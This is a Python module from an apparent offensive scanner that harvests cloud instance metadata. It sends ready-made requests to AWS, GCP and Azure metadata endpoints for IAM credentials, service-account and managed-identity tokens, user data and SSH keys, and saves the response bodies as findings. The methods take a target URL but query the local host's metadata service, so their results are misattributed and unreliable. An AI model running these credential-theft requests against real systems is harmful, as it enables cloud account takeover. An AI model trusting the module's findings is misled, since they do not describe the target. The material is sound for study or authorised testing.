"""Cloud Security Module — AWS/GCP/Azure metadata and IAM attacks.

A real attacker doesn't just test the app.
They test the cloud infrastructure behind it.

This module:
1. AWS metadata endpoint testing (IMDSv1/v2)
2. GCP metadata endpoint testing
3. Azure metadata endpoint testing
4. IAM role abuse
5. Storage bucket enumeration
6. Cloud function enumeration
"""

from __future__ import annotations

import json
from dataclasses import dataclass
from typing import Any, Dict, List, Optional

from titan.core.models import Finding, Severity, AttackType


@dataclass
class CloudPayload:
    """A cloud security test payload."""
    name: str
    provider: str
    endpoint: str
    method: str
    headers: Dict[str, str]
    expected_effect: str
    severity: Severity
    confidence: float


class CloudSecurityTester:
    """Deep cloud security testing."""

    # ── AWS Metadata Payloads ───────────────────────────────────────────

    AWS_METADATA_PAYLOADS = [
        CloudPayload(
            name="aws_imdsv1",
            provider="aws",
            endpoint="http://169.254.169.254/latest/meta-data/",
            method="GET",
            headers={},
            expected_effect="metadata_access",
            severity=Severity.CRITICAL,
            confidence=0.95,
        ),
        CloudPayload(
            name="aws_iam_credentials",
            provider="aws",
            endpoint="http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            method="GET",
            headers={},
            expected_effect="iam_credentials",
            severity=Severity.CRITICAL,
            confidence=0.95,
        ),
        CloudPayload(
            name="aws_user_data",
            provider="aws",
            endpoint="http://169.254.169.254/latest/user-data",
            method="GET",
            headers={},
            expected_effect="user_data_leak",
            severity=Severity.CRITICAL,
            confidence=0.90,
        ),
        CloudPayload(
            name="aws_security_credentials",
            provider="aws",
            endpoint="http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
            method="GET",
            headers={},
            expected_effect="security_credentials",
            severity=Severity.CRITICAL,
            confidence=0.90,
        ),
        CloudPayload(
            name="aws_spot",
            provider="aws",
            endpoint="http://169.254.169.254/latest/meta-data/spot/instance-action",
            method="GET",
            headers={},
            expected_effect="spot_info",
            severity=Severity.HIGH,
            confidence=0.80,
        ),
        CloudPayload(
            name="aws_ssh_keys",
            provider="aws",
            endpoint="http://169.254.169.254/latest/meta-data/public-keys",
            method="GET",
            headers={},
            expected_effect="ssh_key_leak",
            severity=Severity.HIGH,
            confidence=0.85,
        ),
    ]

    # ── GCP Metadata Payloads ───────────────────────────────────────────

    GCP_METADATA_PAYLOADS = [
        CloudPayload(
            name="gcp_metadata",
            provider="gcp",
            endpoint="http://metadata.google.internal/computeMetadata/v1/",
            method="GET",
            headers={"Metadata-Flavor": "Google"},
            expected_effect="metadata_access",
            severity=Severity.CRITICAL,
            confidence=0.95,
        ),
        CloudPayload(
            name="gcp_service_account",
            provider="gcp",
            endpoint="http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            method="GET",
            headers={"Metadata-Flavor": "Google"},
            expected_effect="service_account_token",
            severity=Severity.CRITICAL,
            confidence=0.95,
        ),
        CloudPayload(
            name="gcp_project",
            provider="gcp",
            endpoint="http://metadata.google.internal/computeMetadata/v1/project/project-id",
            method="GET",
            headers={"Metadata-Flavor": "Google"},
            expected_effect="project_id",
            severity=Severity.HIGH,
            confidence=0.90,
        ),
        CloudPayload(
            name="gcp_instance_name",
            provider="gcp",
            endpoint="http://metadata.google.internal/computeMetadata/v1/instance/name",
            method="GET",
            headers={"Metadata-Flavor": "Google"},
            expected_effect="instance_info",
            severity=Severity.MEDIUM,
            confidence=0.85,
        ),
    ]

    # ── Azure Metadata Payloads ─────────────────────────────────────────

    AZURE_METADATA_PAYLOADS = [
        CloudPayload(
            name="azure_metadata",
            provider="azure",
            endpoint="http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            method="GET",
            headers={"Metadata": "true"},
            expected_effect="metadata_access",
            severity=Severity.CRITICAL,
            confidence=0.95,
        ),
        CloudPayload(
            name="azure_identity",
            provider="azure",
            endpoint="http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
            method="GET",
            headers={"Metadata": "true"},
            expected_effect="identity_token",
            severity=Severity.CRITICAL,
            confidence=0.90,
        ),
        CloudPayload(
            name="azure_user_data",
            provider="azure",
            endpoint="http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-02-01",
            method="GET",
            headers={"Metadata": "true"},
            expected_effect="user_data",
            severity=Severity.HIGH,
            confidence=0.85,
        ),
    ]

    def __init__(self, context: Any = None):
        self.context = context
        self._findings: List[Finding] = []

    async def test_aws(self, target_url: str) -> List[Finding]:
        """Test AWS metadata endpoints."""
        findings = []
        for payload in self.AWS_METADATA_PAYLOADS:
            try:
                response = await self._send_request(
                    payload.endpoint, payload.method, payload.headers
                )
                if response and self._check_metadata(response, payload):
                    finding = Finding(
                        target=target_url,
                        url=payload.endpoint,
                        method=payload.method,
                        param="aws_metadata",
                        location="cloud",
                        payload="",
                        attack_type=AttackType.INFO_LEAK,
                        severity=payload.severity,
                        verified=True,
                        confidence=payload.confidence,
                        status=response.get("status", 0),
                        body=response.get("body", "")[:2000],
                        diffs=[f"cloud:{payload.name}"],
                        notes=f"AWS metadata: {payload.name}",
                    )
                    findings.append(finding)
            except Exception:
                continue
        self._findings.extend(findings)
        return findings

    async def test_gcp(self, target_url: str) -> List[Finding]:
        """Test GCP metadata endpoints."""
        findings = []
        for payload in self.GCP_METADATA_PAYLOADS:
            try:
                response = await self._send_request(
                    payload.endpoint, payload.method, payload.headers
                )
                if response and self._check_metadata(response, payload):
                    finding = Finding(
                        target=target_url,
                        url=payload.endpoint,
                        method=payload.method,
                        param="gcp_metadata",
                        location="cloud",
                        payload="",
                        attack_type=AttackType.INFO_LEAK,
                        severity=payload.severity,
                        verified=True,
                        confidence=payload.confidence,
                        status=response.get("status", 0),
                        body=response.get("body", "")[:2000],
                        diffs=[f"cloud:{payload.name}"],
                        notes=f"GCP metadata: {payload.name}",
                    )
                    findings.append(finding)
            except Exception:
                continue
        self._findings.extend(findings)
        return findings

    async def test_azure(self, target_url: str) -> List[Finding]:
        """Test Azure metadata endpoints."""
        findings = []
        for payload in self.AZURE_METADATA_PAYLOADS:
            try:
                response = await self._send_request(
                    payload.endpoint, payload.method, payload.headers
                )
                if response and self._check_metadata(response, payload):
                    finding = Finding(
                        target=target_url,
                        url=payload.endpoint,
                        method=payload.method,
                        param="azure_metadata",
                        location="cloud",
                        payload="",
                        attack_type=AttackType.INFO_LEAK,
                        severity=payload.severity,
                        verified=True,
                        confidence=payload.confidence,
                        status=response.get("status", 0),
                        body=response.get("body", "")[:2000],
                        diffs=[f"cloud:{payload.name}"],
                        notes=f"Azure metadata: {payload.name}",
                    )
                    findings.append(finding)
            except Exception:
                continue
        self._findings.extend(findings)
        return findings

    async def test_all_cloud(self, target_url: str) -> List[Finding]:
        """Test all cloud providers."""
        findings = []
        findings.extend(await self.test_aws(target_url))
        findings.extend(await self.test_gcp(target_url))
        findings.extend(await self.test_azure(target_url))
        return findings

    async def _send_request(self, url: str, method: str, headers: Dict[str, str]) -> Optional[Dict[str, Any]]:
        try:
            import aiohttp
            async with aiohttp.ClientSession() as session:
                async with session.request(method, url, headers=headers, timeout=aiohttp.ClientTimeout(total=3)) as resp:
                    return {"status": resp.status, "body": await resp.text(), "headers": dict(resp.headers)}
        except Exception:
            return None

    def _check_metadata(self, response: Dict[str, Any], payload: CloudPayload) -> bool:
        status = response.get("status", 0)
        body = response.get("body", "")
        if status == 200 and body and body not in ("null", ""):
            return True
        if status == 400 and "metadata" in body.lower():
            return True
        return False

    def get_findings(self) -> List[Finding]:
        return self._findings
